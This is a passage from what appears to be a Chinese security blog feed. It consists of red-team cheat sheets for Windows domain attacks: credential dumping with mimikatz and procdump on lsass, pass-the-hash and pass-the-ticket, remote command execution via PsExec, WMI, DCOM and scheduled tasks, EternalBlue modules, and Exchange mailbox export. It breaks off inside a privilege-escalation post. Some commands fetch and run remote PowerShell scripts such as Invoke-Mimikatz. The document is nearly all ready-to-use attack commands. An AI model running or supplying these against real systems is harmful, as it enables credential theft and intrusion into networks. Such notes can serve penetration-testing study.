href="#建立-IPC-连接" class="headerlink" title="建立 IPC 连接"></a>建立 IPC 连接</h5><h5 id="创建名为-task-的计划任务"><a href="#创建名为-task-的计划任务" class="headerlink" title="创建名为 task 的计划任务"></a>创建名为 task 的计划任务</h5><pre class=" language-cmd"><code class="language-cmd">schtask /create /s IP /tn test /sc onstart /tr c:\payload.bat /ru system /f</code></pre><h5 id="执行该计划任务"><a href="#执行该计划任务" class="headerlink" title="执行该计划任务"></a>执行该计划任务</h5><pre class=" language-cmd"><code class="language-cmd">schtask /run /s IP /i /tn "test"</code></pre><h5 id="删除计划任务"><a href="#删除计划任务" class="headerlink" title="删除计划任务"></a>删除计划任务</h5><pre class=" language-cmd"><code class="language-cmd">schtask /delete /s IP /tn "test" /f</code></pre><h2 id="Windows-系统散列值获取"><a href="#Windows-系统散列值获取" class="headerlink" title="Windows 系统散列值获取"></a>Windows 系统散列值获取</h2><h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><h4 id="GetPass"><a href="#GetPass" class="headerlink" title="GetPass"></a>GetPass</h4><pre class=" language-cmd"><code class="language-cmd">GetPassword_x64.exe</code></pre><h4 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h4><pre class=" language-cmd"><code class="language-cmd">PwDump7.exe</code></pre><h4 id="通过-SAM-和-SYSTEM-文件抓取密码"><a href="#通过-SAM-和-SYSTEM-文件抓取密码" class="headerlink" title="通过 SAM 和 SYSTEM 文件抓取密码"></a>通过 SAM 和 SYSTEM 文件抓取密码</h4><h5 id="导出-SAM-和-System-文件"><a href="#导出-SAM-和-System-文件" class="headerlink" title="导出 SAM 和 System 文件"></a>导出 SAM 和 System 文件</h5><pre class=" language-cmd"><code class="language-cmd">reg save hklm\sam sam.hivereg save hklm\system system.hive</code></pre><h5 id="通过读取-SAM-和-System-文件获得-NTLM-Hash"><a href="#通过读取-SAM-和-System-文件获得-NTLM-Hash" class="headerlink" title="通过读取 SAM 和 System 文件获得 NTLM Hash"></a>通过读取 SAM 和 System 文件获得 NTLM Hash</h5><ul><li>mimikatz</li></ul><pre><code>lsadump::sam /sam:sam.hive system:system.hive</code></pre><ul><li>cain</li><li>目标机器使用 mimikatz 直接读取本地 SAM 文件</li></ul><pre><code>privilege::debuglsadump::sam</code></pre><h5 id="使用-mimikatz-在线读取-SAM-文件"><a href="#使用-mimikatz-在线读取-SAM-文件" class="headerlink" title="使用 mimikatz 在线读取 SAM 文件"></a>使用 mimikatz 在线读取 SAM 文件</h5><pre class=" language-cmd"><code class="language-cmd">mimikatz.exe "privilege::debug" "log" "sekurlsa::loginpasswords" </code></pre><h5 id="使用-mimikatz-离线读取-lass-dmp-文件"><a href="#使用-mimikatz-离线读取-lass-dmp-文件" class="headerlink" title="使用 mimikatz 离线读取 lass.dmp 文件"></a>使用 mimikatz 离线读取 lass.dmp 文件</h5><h6 id="导出-lass-dmp-文件"><a href="#导出-lass-dmp-文件" class="headerlink" title="导出 lass.dmp 文件"></a>导出 lass.dmp 文件</h6><ul><li>使用任务管理器导出 lsass.dmp 文件</li></ul><p>任务管理器找到 <code>lsass.exe</code> 进程，右键，选择 “Create Dump File” 选项</p><ul><li>使用 Procdump 导出 lsass.dmp 文件</li></ul><p>微软官方发布的工具，免杀</p><pre class=" language-cmd"><code class="language-cmd">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><h6 id="使用-mimikatz-导出-lsass-dmp-文件中的密码值"><a href="#使用-mimikatz-导出-lsass-dmp-文件中的密码值" class="headerlink" title="使用 mimikatz 导出 lsass.dmp 文件中的密码值"></a>使用 mimikatz 导出 lsass.dmp 文件中的密码值</h6><pre><code>sekurlsa::mimidump lsass.dmpsekurlsa::logonpasswords full</code></pre><h4 id="使用-Powershell-对散列值进行-Dump-操作"><a href="#使用-Powershell-对散列值进行-Dump-操作" class="headerlink" title="使用 Powershell 对散列值进行 Dump 操作"></a>使用 Powershell 对散列值进行 Dump 操作</h4><pre class=" language-powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\Get<span class="token operator">-</span>PassHashes<span class="token punctuation">.</span>ps1</code></pre><h4 id="使用-Powershell-远程加载-mimikatz-抓取散列值和明文密码"><a href="#使用-Powershell-远程加载-mimikatz-抓取散列值和明文密码" class="headerlink" title="使用 Powershell 远程加载 mimikatz 抓取散列值和明文密码"></a>使用 Powershell 远程加载 mimikatz 抓取散列值和明文密码</h4><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PwoerSploit/master/Exfilration/Invoke-Mimikatz.ps1');Invoke-Mimikatz"</span></code></pre><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><h3 id="使用-NTLM-Hash-进行哈希传递"><a href="#使用-NTLM-Hash-进行哈希传递" class="headerlink" title="使用 NTLM Hash 进行哈希传递"></a>使用 NTLM Hash 进行哈希传递</h3><pre class=" language-cmd"><code class="language-cmd">mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]"</code></pre><h3 id="使用-AES-256-密钥进行哈希传递"><a href="#使用-AES-256-密钥进行哈希传递" class="headerlink" title="使用 AES-256 密钥进行哈希传递"></a>使用 AES-256 密钥进行哈希传递</h3><p>使用 mimikatz 抓取 AES-256 密钥</p><pre class=" language-cmd"><code class="language-cmd">mimikatz "privilege::debug" "sekurlsa::ekeys"</code></pre><p>pth攻击（目标机器必须安装 KB2871997）</p><pre class=" language-cmd"><code class="language-cmd">mimikatz "privilege::debug" "sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]"</code></pre><h2 id="票据传递"><a href="#票据传递" class="headerlink" title="票据传递"></a>票据传递</h2><h3 id="使用-mimikatz-进行票据传递"><a href="#使用-mimikatz-进行票据传递" class="headerlink" title="使用 mimikatz 进行票据传递"></a>使用 mimikatz 进行票据传递</h3><h4 id="导出票据"><a href="#导出票据" class="headerlink" title="导出票据"></a>导出票据</h4><pre class=" language-cmd"><code class="language-cmd">mimikatz "privilege::debug" "sekurlsa::tickets /exports"</code></pre><h4 id="注入票据"><a href="#注入票据" class="headerlink" title="注入票据"></a>注入票据</h4><pre class=" language-cmd"><code class="language-cmd">mimikatz "kerberos::ptt" "C:\xxx.kirbi"</code></pre><h3 id="使用-kekeo-进行票据传递"><a href="#使用-kekeo-进行票据传递" class="headerlink" title="使用 kekeo 进行票据传递"></a>使用 kekeo 进行票据传递</h3><h4 id="生成票据文件"><a href="#生成票据文件" class="headerlink" title="生成票据文件"></a>生成票据文件</h4><pre class=" language-cmd"><code class="language-cmd">kekeo "tgt:ask /user:administrator /domain:pentest.hack /ntlm:[NTLM]"</code></pre><h4 id="将票据文件导入内存"><a href="#将票据文件导入内存" class="headerlink" title="将票据文件导入内存"></a>将票据文件导入内存</h4><pre class=" language-cmd"><code class="language-cmd">kekeo "kerberos::ptt xxx.kirbi"</code></pre><h2 id="PsExec-的使用"><a href="#PsExec-的使用" class="headerlink" title="PsExec 的使用"></a>PsExec 的使用</h2><h3 id="PsTools-工具中的-PsExec"><a href="#PsTools-工具中的-PsExec" class="headerlink" title="PsTools 工具中的 PsExec"></a>PsTools 工具中的 PsExec</h3><h4 id="建立-IPC-连接-1"><a href="#建立-IPC-连接-1" class="headerlink" title="建立 IPC 连接"></a>建立 IPC 连接</h4><pre class=" language-cmd"><code class="language-cmd">net use \\IP\ipc$ "password" /u:administrator</code></pre><h4 id="获取-System-权限的-交互式shell"><a href="#获取-System-权限的-交互式shell" class="headerlink" title="获取 System 权限的 交互式shell"></a>获取 System 权限的 交互式shell</h4><pre class=" language-cmd"><code class="language-cmd">PsExec.exe -accepteula \\IP -s cmd.exe或PsExec.exe -accepteula \\IP -s cmd.exe /c ipconfig</code></pre><p>如果不使用 -s 命令，则创建一个 Administrator 权限的 shell</p><p>如果没有建立 IPC 连接：</p><pre class=" language-cmd"><code class="language-cmd">PsExec.exe -accepteula \\IP -u administrator -p password -s cmd.exe</code></pre><h3 id="Metasploit-中的-psexec-模块"><a href="#Metasploit-中的-psexec-模块" class="headerlink" title="Metasploit 中的 psexec 模块"></a>Metasploit 中的 psexec 模块</h3><ul><li>exploit/windows/smb/psexec</li><li>exploit/windows/smb/psexec_psh（powershell 版本）</li></ul><h2 id="WMI-的使用"><a href="#WMI-的使用" class="headerlink" title="WMI 的使用"></a>WMI 的使用</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre class=" language-cmd"><code class="language-cmd">wmic /node:IP /user:administrator /password:passed process call create "cmd.exe /c ipconfig > ip.txt"</code></pre><p>建立 IPC 连接后，使用 type 命令读取结果：</p><pre class=" language-cmd"><code class="language-cmd">type \\IP\C$\ip.txt</code></pre><h3 id="impacket-包中的-wmiexec"><a href="#impacket-包中的-wmiexec" class="headerlink" title="impacket 包中的 wmiexec"></a>impacket 包中的 wmiexec</h3><pre class=" language-cmd"><code class="language-cmd">wmiexec.py administrator:password@IP</code></pre><h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>半交互式 shell</p><pre class=" language-cmd"><code class="language-cmd">cscript.exe //nologo wmiexec.vbs /shell IP administrator password</code></pre><p>执行单条命令</p><pre class=" language-cmd"><code class="language-cmd">cscript.exe wmiexec.vbs /cmd IP administrator password "ipconfig"</code></pre><p>对于运行时间较长的命令，例如 <code>ping</code>、<code>systeminfo</code>，需要加入 <code>-wait 5000</code> 命令或者更长等待时间。在运行 <code>nc</code> 等不需要输出单需要一直等待运行的进程时，需要使用 <code>-persist</code> 参数。</p><h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>powersploit工具包中</p><p>将 <code>Invoke-Wmicommand.ps1</code> 导入系统</p><pre class=" language-powershell"><code class="language-powershell"><span class="token variable">$User</span> = <span class="token string">"pentest.hacker\administrator"</span><span class="token variable">$Password</span> = ConvertTo<span class="token operator">-</span>SecureString <span class="token operator">-</span>String <span class="token string">"password"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token variable">$Cred</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>AutoMation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span> <span class="token variable">$Password</span><span class="token variable">$Remote</span> = Invoke<span class="token operator">-</span>WmiCommand <span class="token operator">-</span>Payload <span class="token punctuation">{</span>ipconfig<span class="token punctuation">}</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span> <span class="token operator">-</span>ComputerName IP<span class="token variable">$Remore</span><span class="token punctuation">.</span>PayloadOutput</code></pre><h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>利用 <code>powershell</code> 自带的 <code>Invoke-WMIMethod</code> ，非交互，无回显。</p><pre class=" language-powershell"><code class="language-powershell"><span class="token variable">$User</span> = <span class="token string">"pentest.hacker\administrator"</span><span class="token variable">$Password</span> = ConvertTo<span class="token operator">-</span>SecureString <span class="token operator">-</span>String <span class="token string">"password"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token variable">$Cred</span> = <span class="token function">New-Object</span> <span class="token operator">-</span>TypeName System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>AutoMation<span class="token punctuation">.</span>PSCredential <span class="token operator">-</span>ArgumentList <span class="token variable">$User</span><span class="token punctuation">,</span> <span class="token variable">$Password</span><span class="token variable">$Remote</span> = <span class="token function">Invoke-WMIMethod</span> <span class="token operator">-</span><span class="token keyword">Class</span> Win32_Process <span class="token operator">-</span>Name Create <span class="token operator">-</span>ArgumentList <span class="token string">"calc.exe"</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span> <span class="token operator">-</span>ComputerName IP</code></pre><h2 id="永恒之蓝漏洞"><a href="#永恒之蓝漏洞" class="headerlink" title="永恒之蓝漏洞"></a>永恒之蓝漏洞</h2><ul><li>auxiliary/scanner/smb/smb_ms17_010</li><li>exploit/windows/smb/ms17_010_eternalblue</li></ul><h2 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h2><h3 id="C-版本-smbexec"><a href="#C-版本-smbexec" class="headerlink" title="C++ 版本 smbexec"></a>C++ 版本 smbexec</h3><p>将 <code>execserver.exe</code> 上传到到目标系统的 <code>C:\Windows\</code> 目录下，解除 <code>UAC</code> 对命令的限制。</p><pre class=" language-cmd"><code class="language-cmd">net use \\IP "password" /user:pentest\administratortest.exe IP administrator password whoami c$</code></pre><h3 id="impacket-工具包中的-smbexec-py"><a href="#impacket-工具包中的-smbexec-py" class="headerlink" title="impacket 工具包中的 smbexec.py"></a>impacket 工具包中的 smbexec.py</h3><pre class=" language-cmd"><code class="language-cmd">smbexec.py penteer/administrator:password\@IP</code></pre><h2 id="DCOM-在远程系统中的使用"><a href="#DCOM-在远程系统中的使用" class="headerlink" title="DCOM 在远程系统中的使用"></a>DCOM 在远程系统中的使用</h2><h3 id="通过本地-DCOM-执行命令"><a href="#通过本地-DCOM-执行命令" class="headerlink" title="通过本地 DCOM 执行命令"></a>通过本地 DCOM 执行命令</h3><h4 id="获取-DCOM-程序列表"><a href="#获取-DCOM-程序列表" class="headerlink" title="获取 DCOM 程序列表"></a>获取 DCOM 程序列表</h4><p>windows server 2012 及以上</p><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>CimInstance Win32_DCOMApplicatioon</code></pre><p>Windows 7、Windows Server 2008</p><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>WmicObject <span class="token operator">-</span>Namespace ROOT\CIMV2 <span class="token operator">-</span><span class="token keyword">Class</span> Win32_DCOMApplication</code></pre><h4 id="使用-DCOM-执行任意命令"><a href="#使用-DCOM-执行任意命令" class="headerlink" title="使用 DCOM 执行任意命令"></a>使用 DCOM 执行任意命令</h4><p>本地启动一个管理员权限的 powershell </p><pre class=" language-powershell"><code class="language-powershell"><span class="token namespace">[System.Activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token namespace">[type]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application"</span><span class="token punctuation">,</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Document<span class="token punctuation">.</span>ActiveView<span class="token punctuation">.</span>ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"/c calc.exe"</span><span class="token punctuation">,</span><span class="token string">"Minimzed"</span><span class="token punctuation">)</span></code></pre><h3 id="使用-DCOM-在远程机器上执行命令"><a href="#使用-DCOM-在远程机器上执行命令" class="headerlink" title="使用 DCOM 在远程机器上执行命令"></a>使用 DCOM 在远程机器上执行命令</h3><p>远程连接时必须使用具有本地管理员权限的账号</p><h4 id="使用-IPC-连接远程计算机"><a href="#使用-IPC-连接远程计算机" class="headerlink" title="使用 IPC$ 连接远程计算机"></a>使用 IPC$ 连接远程计算机</h4><pre class=" language-cmd"><code class="language-cmd">net use \\IP "password" /user:pentest.hacker\win7user</code></pre><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><h5 id="调用-MMC20-Application-远程执行命令"><a href="#调用-MMC20-Application-远程执行命令" class="headerlink" title="调用 MMC20_Application 远程执行命令"></a>调用 MMC20_Application 远程执行命令</h5><pre class=" language-powershell"><code class="language-powershell"><span class="token variable">$com</span>=<span class="token namespace">[Activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token namespace">[type]</span>::GetTypeFromProgID<span class="token punctuation">(</span><span class="token string">"MMC20.Application"</span><span class="token punctuation">,</span><span class="token string">"IP"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$com</span><span class="token punctuation">.</span>Document<span class="token punctuation">.</span>ActiveView<span class="token punctuation">.</span>ExecuteShellCommand<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"/c calc.exe"</span><span class="token punctuation">,</span><span class="token string">"Minimzed"</span><span class="token punctuation">)</span></code></pre><h4 id="调用-9BA05972-F6A8-11CF-A442-00A0C90A8F39"><a href="#调用-9BA05972-F6A8-11CF-A442-00A0C90A8F39" class="headerlink" title="调用 9BA05972-F6A8-11CF-A442-00A0C90A8F39"></a>调用 9BA05972-F6A8-11CF-A442-00A0C90A8F39</h4><pre class=" language-powershell"><code class="language-powershell"><span class="token variable">$com</span>=<span class="token namespace">[Type]</span>::GetTypeFromCLSID<span class="token punctuation">(</span><span class="token string">'9BA05972-F6A8-11CF-A442-00A0C90A8F39'</span><span class="token punctuation">,</span><span class="token string">"IP"</span><span class="token punctuation">)</span><span class="token variable">$obj</span>=<span class="token namespace">[System.Activator]</span>::CreateInstance<span class="token punctuation">(</span><span class="token variable">$com</span><span class="token punctuation">)</span><span class="token variable">$item</span>=<span class="token variable">$obj</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token variable">$item</span><span class="token punctuation">.</span>Document<span class="token punctuation">.</span>Application<span class="token punctuation">.</span>ShellExecute<span class="token punctuation">(</span><span class="token string">"cmd.exe"</span><span class="token punctuation">,</span><span class="token string">"/c calc.exe"</span><span class="token punctuation">,</span><span class="token string">"c:\windows\system32"</span><span class="token punctuation">,</span><span class="token string">"<span class="token variable">$null</span>"</span><span class="token punctuation">,</span>0<span class="token punctuation">)</span></code></pre><h2 id="SPN-在域环境中的使用"><a href="#SPN-在域环境中的使用" class="headerlink" title="SPN 在域环境中的使用"></a>SPN 在域环境中的使用</h2><h3 id="SPN-扫描"><a href="#SPN-扫描" class="headerlink" title="SPN 扫描"></a>SPN 扫描</h3><p>PowerShell-AD-Recon</p><h4 id="利用-SPN-发现域中所有的-MSSQL-服务"><a href="#利用-SPN-发现域中所有的-MSSQL-服务" class="headerlink" title="利用 SPN 发现域中所有的 MSSQL 服务"></a>利用 SPN 发现域中所有的 MSSQL 服务</h4><pre class=" language-powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSMSSQLServer<span class="token punctuation">.</span>ps1Discover<span class="token operator">-</span>PSMSSQLServers</code></pre><h4 id="扫描域中所有的-SPN-信息"><a href="#扫描域中所有的-SPN-信息" class="headerlink" title="扫描域中所有的 SPN 信息"></a>扫描域中所有的 SPN 信息</h4><pre class=" language-powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\Discover<span class="token operator">-</span>PSInterestingServices<span class="token punctuation">.</span>ps1Discover<span class="token operator">-</span>PSInterestingServices</code></pre><p>在不使用第三方 Powershell 脚本的情况下，输入如下命令查询所有的 SPN 信息</p><pre class=" language-cmd"><code class="language-cmd">setspn -T domain -q */*</code></pre><h3 id="Exchange-邮件服务器攻击"><a href="#Exchange-邮件服务器攻击" class="headerlink" title="Exchange 邮件服务器攻击"></a>Exchange 邮件服务器攻击</h3><h3 id="Exchange-服务发现"><a href="#Exchange-服务发现" class="headerlink" title="Exchange 服务发现"></a>Exchange 服务发现</h3><h4 id="基于端口扫描发现"><a href="#基于端口扫描发现" class="headerlink" title="基于端口扫描发现"></a>基于端口扫描发现</h4><pre class=" language-cmd"><code class="language-cmd">nmap -A -O -sV IP</code></pre><h4 id="SPN-查询"><a href="#SPN-查询" class="headerlink" title="SPN 查询"></a>SPN 查询</h4><pre class=" language-cmd"><code class="language-cmd">setspn -T pentest.hacker -F -Q */*</code></pre><h3 id="Exchange-的基本操作"><a href="#Exchange-的基本操作" class="headerlink" title="Exchange 的基本操作"></a>Exchange 的基本操作</h3><h4 id="查看邮件数据库"><a href="#查看邮件数据库" class="headerlink" title="查看邮件数据库"></a>查看邮件数据库</h4><pre class=" language-powershell"><code class="language-powershell"><span class="token function">add-pssnapin</span> microsoft<span class="token punctuation">.</span>exchange<span class="token operator">*</span>Get<span class="token operator">-</span>MailboxDatabase <span class="token operator">-</span>server <span class="token string">"Exchange1"</span></code></pre><p>指定数据库，对其进行详细信息查询</p><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>MailboxDatabase <span class="token operator">-</span>Identify <span class="token string">'Mailbox Database 1894576043'</span> <span class="token punctuation">|</span> <span class="token function">Format-List</span> Name<span class="token punctuation">,</span>EdbFilePath<span class="token punctuation">,</span>LogFolderPath</code></pre><h4 id="获取现有用户的邮件地址"><a href="#获取现有用户的邮件地址" class="headerlink" title="获取现有用户的邮件地址"></a>获取现有用户的邮件地址</h4><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>Mailbox <span class="token punctuation">|</span> format<span class="token operator">-</span>tables Name<span class="token punctuation">,</span>WindowsEmailAddress</code></pre><h4 id="查看指定用户的邮箱使用信息"><a href="#查看指定用户的邮箱使用信息" class="headerlink" title="查看指定用户的邮箱使用信息"></a>查看指定用户的邮箱使用信息</h4><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>Mailboxstatistics <span class="token operator">-</span>identify administrator <span class="token punctuation">|</span> <span class="token function">Select</span> DisplayName<span class="token punctuation">,</span>ItemCount<span class="token punctuation">,</span>TotalItemSize<span class="token punctuation">,</span>LastLogonTime</code></pre><h4 id="获取用户邮箱中的邮件数量"><a href="#获取用户邮箱中的邮件数量" class="headerlink" title="获取用户邮箱中的邮件数量"></a>获取用户邮箱中的邮件数量</h4><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>Mailbox <span class="token operator">-</span>ResultSize Unlimited <span class="token punctuation">|</span> Get<span class="token operator">-</span>MailboxStatistics <span class="token punctuation">|</span> <span class="token function">Sort-Object</span> TotalItemSize <span class="token operator">-</span>Decend</code></pre><h3 id="导出指定的电子邮件"><a href="#导出指定的电子邮件" class="headerlink" title="导出指定的电子邮件"></a>导出指定的电子邮件</h3><h4 id="配置用户的导入、导出权限"><a href="#配置用户的导入、导出权限" class="headerlink" title="配置用户的导入、导出权限"></a>配置用户的导入、导出权限</h4><h5 id="查看用户权限"><a href="#查看用户权限" class="headerlink" title="查看用户权限"></a>查看用户权限</h5><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>ManagementRoleAssignment <span class="token operator">-</span>role <span class="token string">"Mailbox Import Export"</span> <span class="token punctuation">|</span> <span class="token function">Format-List</span> RoleAssigneeName</code></pre><h5 id="添加权限"><a href="#添加权限" class="headerlink" title="添加权限"></a>添加权限</h5><pre class=" language-powershell"><code class="language-powershell">New<span class="token operator">-</span>ManagementRoleAssignment <span class="token operator">-</span>Name <span class="token string">"Import Export_Domain Admins"</span> <span class="token operator">-</span>User <span class="token string">"Administrator"</span> <span class="token operator">-</span>Role <span class="token string">"Mailbox Import Export"</span></code></pre><h5 id="删除权限"><a href="#删除权限" class="headerlink" title="删除权限"></a>删除权限</h5><pre class=" language-powershell"><code class="language-powershell">New<span class="token operator">-</span>ManagementRoleAssignment <span class="token string">"Import Export_Domain Admins"</span> <span class="token operator">-</span>Confirm:<span class="token boolean">$false</span></code></pre><h4 id="设置网络共享文件夹"><a href="#设置网络共享文件夹" class="headerlink" title="设置网络共享文件夹"></a>设置网络共享文件夹</h4><pre class=" language-cmd"><code class="language-cmd">net share inetpub=c:\inetpub /grant:everyone,full</code></pre><h4 id="导出用户的电子邮件"><a href="#导出用户的电子邮件" class="headerlink" title="导出用户的电子邮件"></a>导出用户的电子邮件</h4><pre class=" language-powershell"><code class="language-powershell">New<span class="token operator">-</span>MailboxExportRequest <span class="token operator">-</span>Mailbox administrator <span class="token operator">-</span>FilePath \\IP\inetpub\administrator<span class="token punctuation">.</span>pst</code></pre><h4 id="管理导出请求"><a href="#管理导出请求" class="headerlink" title="管理导出请求"></a>管理导出请求</h4><p>查看之前的导出记录</p><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>MailboxExportRequest</code></pre><p>将指定用户的已完成导出请求删除</p><pre class=" language-powershell"><code class="language-powershell">Remove<span class="token operator">-</span>MailboxExportRequest <span class="token operator">-</span>Identify Administrator\mailboxexport</code></pre><p>将所有已完成导出的请求删除</p><pre class=" language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>MailboxExportRequest <span class="token operator">-</span>Status Completed <span class="token punctuation">|</span> Remove<span class="token operator">-</span>MailboxExportRequest</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 域环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升防御分析</title>
      <link href="/2020/02/15/quan-xian-ti-sheng-fang-yu-fen-xi/"/>
      <url>/2020/02/15/quan-xian-ti-sheng-fang-yu-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升防御分析"><a href="#权限提升防御分析" class="headerlink" title="权限提升防御分析"></a>权限提升防御分析</h1><h2 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h2><h3 id="手动执行命令发现缺失补丁"><a href="#手动执行命令发现缺失补丁" class="headerlink" title="手动执行命令发现缺失补丁"></a>手动执行命令发现缺失补丁</h3><pre class=" language-cmd"><code class="language-cmd">systeminfowmic qfe get Caption,Description,HotfixID,InstalledOn</code></pre><p>发现补丁编号</p><pre class=" language-cmd"><code class="language-cmd">wmic qfe get Caption,Description,HotfixID,InstalledOn | findstr C:"KB3143141" C:/"KB976902"</code></pre><h3 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows Exploit Suggester"></a>Windows Exploit Suggester</h3><p>使用  <code>systeminfo</code> 命令获取当前系统的补丁安装状况，并将信息导入 <code>patches.txt</code> 文件中</p><ol><li>更新补丁信息</li></ol><pre class=" language-bash"><code class="language-bash">python windows-exploit-suggester.py --update</code></pre><ol start="2"><li>检查漏洞</li></ol><pre class=" language-bash"><code class="language-bash">python windows-exploit-suggester.py -d 2019-02-02-mssb.xls -i patches.txt</code></pre><p><code>Metasploit</code> 内置 <code>local_exploit_suggester</code> 模块</p><h3 id="powershell-中的-sherlock-脚本"><a href="#powershell-中的-sherlock-脚本" class="headerlink" title="powershell 中的 sherlock 脚本"></a>powershell 中的 sherlock 脚本</h3><p><a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock</a></p><pre class=" language-powershell"><code class="language-powershell"><span class="token function">import-module</span> <span class="token punctuation">.</span>\Sherlock<span class="token punctuation">.</span>ps1 Find<span class="token operator">-</span>AllVulns</code></pre><p><a href="https://github.com/rasta-mouse/Watson" target="_blank" rel="noopener">https://github.com/rasta-mouse/Watson</a></p><h2 id="Windows-配置错误利用"><a href="#Windows-配置错误利用" class="headerlink" title="Windows 配置错误利用"></a>Windows 配置错误利用</h2><h3 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h3><h4 id="powerup"><a href="#powerup" class="headerlink" title="powerup"></a>powerup</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p><pre class=" language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>Command <span class="token string">"&amp;{Import-Module .\PowerUP.ps1;Invoke-AllChecks}"</span></code></pre><pre class=" language-powershell"><code class="language-powershell">powershell<span class="token punctuation">.</span>exe <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowershellEmpire/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks"</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20200213110922.png-water_print" alt=""></p><h4 id="metasploit-下的利用"><a href="#metasploit-下的利用" class="headerlink" title="metasploit 下的利用"></a>metasploit 下的利用</h4><p>对应模块 <code>service_permissions</code>。</p><h3 id="注册表键-AlwaysInstallElevated"><a href="#注册表键-AlwaysInstallElevated" class="headerlink" title="注册表键 AlwaysInstallElevated"></a>注册表键 AlwaysInstallElevated</h3><p><code>AlwaysInstallElevated</code> 是一个策略设置。微软允许非授权用户以 <code>SYSTEM</code> 权限运行安装文件(MSI)，如果用户启用此策略设置，那么黑客利用恶意的 <code>MSI</code> 文件就可以进行管理员权限的提升。假设我们拿到目标主机的 <code>Meterpreter</code> 会话后并没能通过一些常规方式取得 <code>SYSTEM</code> 权限，那么 <code>AlwaysInstallElevated</code> 提权可以给我们带来另一条思路。</p><ul><li>手动检测注册表：</li></ul><pre class=" language-cmd"><code class="language-cmd">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedreg query 